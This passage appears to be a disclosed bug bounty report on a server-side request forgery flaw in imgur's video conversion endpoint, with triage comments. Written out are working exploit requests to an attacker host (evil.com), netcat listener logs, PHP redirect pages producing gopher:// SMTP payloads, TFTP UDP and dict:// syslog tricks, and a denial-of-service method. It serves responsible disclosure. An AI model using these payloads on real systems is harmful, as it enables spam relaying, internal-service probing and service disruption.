When a user requests conversion of such a video, imgur's servers perform an HTTP request to a user-supplied URL in order to discover the URL-s content-type and length. It is evident that in order to do so imgur utilizes libcurl. However, imgur does not properly validate user input and does not configure libcurl properly which allows an attacker to use various libcurl protocol wrappers other than http(s). For example, an attacker can supply ftp://test.com/file as an URL and imgur will make such a FTP request.\n\nWhat are the exploitable protocols?\n========\nApparently, imgur performs connections over the following protocols:\n* SSH (scp://, sftp://)\n* POP3\n* IMAP\n* SMTP\n* FTP\n* DICT\n* GOPHER\n* TFTP\n\nSeveral leak information about imgur infrastracture (SSH, DICT), other allow more serious exploits (TFTP, DICT, GOPHER).\n\nWhat are the exploits?\n=========\nSimple exploit: information disclosure (and basic PoC of SSRF)\n----------------\nimgur leaks information about installed software versions via SSH and DICT protocols. An attacker may setup a 'netcat' server and force imgur servers to connect to it and leak version information via a connection string, for example:\n\nRequest: https://imgur.com/vidgif/url?url=sftp://evil.com:11111/\n\n```\nevil.com:$ nc -v -l 11111\nConnection from [54.227.37.234] port 11111 [tcp/*] accepted (family 2, sport 36136)\nSSH-2.0-libssh2_1.4.2\n```\n\nRequest: https://imgur.com/vidgif/url?url=sftp://evil.com:11111/\n\n```\nevil.com:$ nc -v -l 11111\nListening on [0.0.0.0] (family 0, port 11111)\nConnection from [54.166.236.232] port 11111 [tcp/*] accepted (family 2, sport 35789)\nCLIENT libcurl 7.40.0\n\nQUIT\n```\n\nThis way an attacker can discover imgur software versions: libssh2 1.4.2 (probably vulnerable to CVE-2015-1782) and libcurl 7.40.0 (probably vulnerable to CVE-2015-3144, CVE-2015-3237). All there are probable RCEs.\n\nCrafted SMTP connection exploit\n-------------\nCurl's GOPHER protocol implementation allows usage of newlines which allows us to craft any kinds of TELNET chat-sessions and thus craft any kind of TELNET-based protocols request. In this example we will craft a SMTP request to mail.ru.\n\nUnfortunately imgur filters GET['url'] and does not allow us to include newlines in the request, however, imgur's libcurl follows redirects which allows us to send a correct GOPHER payload via HTTP 302.\n\nLet's start with a TELNET chat session example, let's craft a malicious php page:\n\nhttp://evil.com/imgur/gopher1.php\n\n```\n\u003c?php\n        header('Location: gopher://evil.com:12346/_HI%0AMultiline%0Atest');\n?\u003e\n```\n\n```\nevil.com:# nc -v -l 12346\nListening on [0.0.0.0] (family 0, port 12346)\nConnection from [54.227.37.234] port 12346 [tcp/*] accepted (family 2, sport 49398)\nHI\nMultiline\ntest\n```\n\nSo, we can send arbitrary telnet commands and can try to perform an **actual SMTP session and send SPAM from Imgur IPs**\n\nTo demonstrate we will use test.smtp.org testing server.\n\nLet's craft a malicious php page (this one is a working example so I use a real server):\n\nhttp://gradeco.ru/imgur/gopher2.php\n\n```\n\u003c?php\n        $commands = array(\n                'HELO test.org',\n                'MAIL FROM: \u003cimgur@imgur.com\u003e',\n                'RCPT TO: \u003cbit-bucket@test.smtp.org\u003e',\n                'DATA',\n                'Test mail',\n                '.'\n        );\n\n        $payload = implode('%0A', $commands);\n\n        header('Location: gopher://test.smtp.org:25/_'.$payload);\n?\u003e\n```\n\nThis code concats our SMTP command into one line delimited by %0A and forces imgur server to send a 'GOPHER' request to a SMTP server while actually sending a **valid SMTP request**\n\nNow, we should navigate to: https://imgur.com/vidgif/url?url=http://gradeco.ru/imgur/gopher2.php?rand=RAND (rand to prevent caching).\n\nAnd imgur server will connect to test.smtp.org and send an email message! You can check it via smtp log here: http://test.smtp.org/log\n\n```\nFeb 10 18:32:41 z testmail[45856]: NOQUEUE: connect from ec2-54-160-191-72.compute-1.amazonaws.com [54.160.191.72]\nFeb 10 18:32:41 z testmail[45856]: AUTH: available mech=SCRAM-SHA-1 DIGEST-MD5 OTP CRAM-MD5 NTLM LOGIN PLAIN ANONYMOUS, allowed mech=EXTERNAL SCRAM-SHA-1 DIGEST-MD5 CRAM-MD5 PLAIN LOGIN ANONYMOUS\nFeb 10 18:32:41 z testmail[45856]: u1AIWf5H045856: Milter: no active filter\nFeb 10 18:32:41 z testmail[45856]: u1AIWf5H045856: from=\u003cimgur@imgur.com\u003e, size=10, class=0, nrcpts=1, msgid=\u003c201602101832.u1AIWf5H045856@test.smtp.org\u003e, proto=SMTP, daemon=testv4, relay=ec2-54-160-191-72.compute-1.amazonaws.com [54.160.191.72]\nFeb 10 18:32:41 z testmail[45857]: u1AIWf5H045856: alias \u003cbit-bucket@test.smtp.org\u003e =\u003e /dev/null\nFeb 10 18:32:41 z testmail[45857]: u1AIWf5H045856: to=/dev/null, ctladdr=\u003cbit-bucket@test.smtp.org\u003e (26/0), delay=00:00:00, xdelay=00:00:00, mailer=*file*, pri=30386, dsn=2.0.0, stat=Sent\nFeb 10 18:32:41 z testmail[45857]: u1AIWf5H045856: done; delay=00:00:00, ntries=1\n```\n\nCool, now we can send spam from imgur servers :)\n\nSame method can be used to connect to, say, REDIS servers, unavailable from external network.\n\nCrafted UDP connection exploit\n-------------\nWe can send almost arbitrary UDP packets by using TFTP protocol, here is an example:\n\nRequest: https://imgur.com/vidgif/url?url=tftp://evil.com:12346/TESTUDPPACKET\n\n```\nevil.com:# nc -v -u -l 12346\nListening on [0.0.0.0] (family 0, port 12346)\nTESTUDPPACKEToctettsize0blksize512timeout6\n```\n\nThis can be used to craft request to various UDP-services like Memcache or REDIS-UDP.\n\nDenial of service exploit (obviously not tested)\n--------------\nIt seems that imgur servers have VERY long timeout for their curl-requests. An attacker can use iptables' TARPIT target to block requests for a prolonged time and CURL's FTP:// protocol which never timeouts.\n\nAn attacker can send all TCP traffic to port 12345 to TARPIT and the request \n\nhttps://imgur.com/vidgif/url?url=ftp://evil.com:12345/TEST\n\nIn this case, imgur will open an FTP connection from 3 servers (apparently due to retries) and keep it open for a long time (10's of seconds). An attacker can initiate lots of vidgif/url requests to exhaust imgur servers' resources.","bounty_amount":"2000.0","formatted_bounty":"$2,000","weakness":{"id":48,"name":"Denial of Service"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2016-03-12T07:09:45.469Z","allow_singular_disclosure_after":-176192321.31438166,"singular_disclosure_allowed":true,"vote_count":44,"voters":["m4t35z","irvinlim","n0x496n","hunter","michiel","aesteral","bogdantcaciuc","abze","fizhimchik","0xsyndr0me","and 34 more..."],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":793344,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"There is also a non-tested possibility to append arbitrary lines to syslog by using:\n\nLocation: dict://localhost:514/TEST","automated_response":false,"created_at":"2016-02-10T18:58:08.007Z","updated_at":"2016-02-10T18:58:08.007Z","actor":{"username":"aesteral","cleared":false,"url":"/aesteral","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/049/af64482266c0d55553a4be28706e5396a489ddf3_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"imgur","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":793397,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"We have accepted the report as valid and added an issue in our internal issue tracker for your report.
